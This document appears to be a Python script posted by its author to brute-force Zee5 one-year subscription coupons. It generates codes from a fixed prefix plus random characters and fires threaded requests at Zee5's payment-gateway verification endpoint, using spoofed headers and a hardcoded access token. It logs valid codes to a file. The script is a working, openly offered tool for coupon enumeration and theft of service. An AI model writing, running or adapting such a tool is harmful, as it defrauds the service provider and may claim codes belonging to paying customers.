# This Script Automatically Generates and Checks Zee5 1 Year Coupons.
# Screenshots : https://postimg.cc/8sX337Sx, https://postimg.cc/xck7S9j8, https://postimg.cc/F726rw1Z

import requests
import random
import string
import threading

def generateCoupon():
    pattern_string = 'Z5FKOC1Y'
    random_chars = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return pattern_string + random_chars

def verifyCoupon(coupon):
    url = f'https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code={coupon}&country_code=IN&translation=en'

    headers = {
        'Origin': 'https://b2bapi.zee5.com',
        'Referer': 'https://b2bapi.zee5.com/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36 Edg/115.0.0.0',
        'X-Access-Token': 'eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInBsYXRmb3JtX2NvZGUiOiJXZWJAJCF0Mzg3MTIiLCJpc3N1ZWRBdCI6IjIwMjMtMDUtMTVUMTg6MzA6MDIrMDAwMCIsInR0bCI6ODY0MDB9.PYc2AZxH9xWHHjyRg2RTnj7WnjRKAF6atJF73gv6rsk'
    }

    response = requests.get(url, headers=headers)
    # print(response.text)

    if 'Please Provide Valid Coupon code' in response.text:
        pass
    elif 'The coupon code entered has expired' in response.text:
        print(f'[EXPIRED] {coupon}')
    elif 'Code already redeemed' in response.text:
        print(f'[REDEEMED] {coupon}')
    elif 'Coupon code applied successfully' in response.text:
        print(f'[V.A.L.I.D] {coupon}')
        file.write(f'{coupon}\n')

print('''
███████╗███████╗███████╗███████╗
╚══███╔╝██╔════╝██╔════╝██╔════╝
  ███╔╝ █████╗  █████╗  ███████╗
 ███╔╝  ██╔══╝  ██╔══╝  ╚════██║                                          
███████╗███████╗███████╗███████║
╚══════╝╚══════╝╚══════╝╚══════╝                                 
  [+] Developed By DE3P4K [+]
''')    

thread = int(input('Enter Number of Vouchers to Generate and Check : '))

file_path = 'Zee5_1Year.txt'
file = open(file_path, 'a')

threads = []

for _ in range(thread):
    coupon = generateCoupon()
    thread = threading.Thread(target=verifyCoupon, args=(coupon,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

file.close()
